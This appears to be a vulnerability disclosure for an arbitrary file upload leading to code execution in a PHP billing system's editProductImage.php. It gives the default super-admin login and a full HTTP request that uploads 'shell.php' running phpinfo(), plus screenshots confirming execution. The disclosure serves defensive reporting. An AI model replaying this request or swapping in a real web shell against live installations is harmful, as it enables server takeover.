# Billing System Project v1.0 by mayuri_k has arbitrary code execution (RCE)

BUG_Author: Fighting

vendors: https://www.sourcecodester.com/php/14831/billing-system-project-php-source-code-free-download.html

The program is built using the xmapp-php8.1 version

Login account: mayurik/rootadmin (Super Admin account)

Vulnerability url: ip/phpinventory/php_action/editProductImage.php?id=1

Loophole location: Billing System Project's editProductImage.php file exists arbitrary file upload (RCE)

Request package for file upload：

```sql
POST /phpinventory/php_action/editProductImage.php?id=1 HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.88/phpinventory/editproduct.php?id=1
Cookie: PHPSESSID=5g4g4dffu1bkrg9jm7nr42ori2
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------315922493531275
Content-Length: 479

-----------------------------315922493531275
Content-Disposition: form-data; name="old_image"

Mi-11X-Pro-Smart-Phones-491996699-i-1-1200Wx1200H.jpg
-----------------------------315922493531275
Content-Disposition: form-data; name="productImage"; filename="shell.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
-----------------------------315922493531275
Content-Disposition: form-data; name="btn"


-----------------------------315922493531275--
```

The files will be uploaded to this directory
![image](https://user-images.githubusercontent.com/54017627/191211139-e42ca006-6bff-4eac-bbce-2b7fceb59f1b.png)



We visited the directory of the file in the browser and found that the code had been executed
![image](https://user-images.githubusercontent.com/54017627/191211240-986446bb-45b4-4cbb-b4ed-1e21be792bd1.png)


